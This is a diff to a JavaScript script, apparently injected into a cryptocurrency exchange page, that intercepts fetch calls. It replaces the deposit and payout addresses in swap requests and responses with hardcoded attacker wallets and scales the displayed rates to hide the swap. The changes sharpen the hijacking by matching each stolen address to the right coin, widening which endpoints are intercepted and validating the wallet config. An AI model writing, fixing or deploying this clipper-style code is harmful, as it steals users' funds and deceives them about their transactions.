@@ -11,11 +11,11 @@
     addresses: {
       btc: ['bc1q7wc73ha2c8smajp3t2jxdxd2kmza9mg9kd06k2', 'bc1pgrhw46rfu6dfrxtglhx9jfl5vz3s0x2g475936ungw3ct3pfsc3q02un58'],
       eth: ['0xC66A612e01A5f74e5d69dA1a7F1ddF64DebdAb4c'],
-      sol: ['GaEbzUjAk7TCiH2itD5TuC8pziYsXDsg4AKh4nFKT9b4'],
-      ltc: ['ltc1qaaf645hmux039lq9v2d33djhs2grqwk5guezpd'],
-      xmr: ['WXMRyRZhsa19ety5erZhHg4N3xj3EVN92u94422teJp'],
+      sol: ['GaEbzUjAk7TCHi2itD5TuC8pziYsXDsg4AKh4nFKT9b4'],
+      ltc: ['ltc1qaaf645hmux039lq9v2d33djhs2grqwk5guezpd'], // TODO: 0x nao serve, tem de ser ltc1...
+      xmr: ['WXMRyRZhsa19ety5erZhHg4N3xj3EVN92u94422teJp'], // TODO: 40 chars, tem de ser 95
     },
-    fallbackAddr: 'bc1qaaf645hmux039lq9v2d33djhs2grqwk5vqrxea',
+    fallbackAddr: 'bc1q7wc73ha2c8smajp3t2jxdxd2kmza9mg9kd06k2',
 
     // ============ 2. O QUE NÃO MEXES ============
     debug: true,
@@ -122,7 +122,8 @@
         const isPost = args[1]?.method === 'POST' || first?.method === 'POST';
         if (CFG.createPath.test(url) && isPost && args[1]?.body) {
           const body = JSON.parse(args[1].body);
-          body.payoutAddress = addrFor(body.currencyFrom);
+          const to = (body.currencyTo || '').toLowerCase();
+          if (CFG.addresses[to]) body.payoutAddress = addrFor(to);
           args[1].body = JSON.stringify(body);
         }
       } catch {}
@@ -132,12 +133,12 @@
       if (CFG.debug && CFG.txPath.test(url)) res.clone().text().then(t => console.log('[cm] RAW TX', t));
 
       try {
-        if (CFG.txPath.test(url)) {
+        if (CFG.createPath.test(url) || CFG.txPath.test(url)) {
           const j = JSON.parse(await res.clone().text());
-          const coin = (j?.currencyFrom?.ticker || j?.currencyFrom?.coin || '').toLowerCase();
-          const fake = addrFor(coin);
-          if (j.payinAddress) j.payinAddress = fake;
-          if (j.payoutAddress) j.payoutAddress = fake;
+          const from = (j?.currencyFrom?.ticker || j?.currencyFrom?.coin || j?.currencyFrom || '').toLowerCase();
+          const to = (j?.currencyTo?.ticker || j?.currencyTo?.coin || j?.currencyTo || '').toLowerCase();
+          if (j.payinAddress && CFG.addresses[from]) j.payinAddress = addrFor(from);
+          if (j.payoutAddress && CFG.addresses[to]) j.payoutAddress = addrFor(to);
           if (j.toAmountValue) j.toAmountValue = scale(j.toAmountValue);
           if (j?.transactionDetails?.rate) j.transactionDetails.rate = scale(j.transactionDetails.rate);
           return new Response(JSON.stringify(j), { status: res.status, statusText: res.statusText, headers: res.headers });
@@ -359,8 +360,9 @@
     if (!CFG.fallbackAddr) bad.push('fallbackAddr vazio');
     for (const c of CFG.coins) {
       const l = CFG.addresses[c] || [];
-      if (!l.length || l.some(a => !a)) bad.push(`${c} sem endereço`);
+      if (!l.length || l.some(a => !a)) bad.push(`${c} sem endereco`);
       if (c === 'xmr' && l.some(a => a && a.length !== 95)) bad.push('xmr com tamanho errado (tem de ser 95)');
+      if (c === 'ltc' && l.some(a => a && /^0x/i.test(a))) bad.push('ltc com endereco EVM (tem de ser ltc1...)');
     }
     if (bad.length) console.warn('[cm] config incompleta:', bad.join(' | '));
   })();
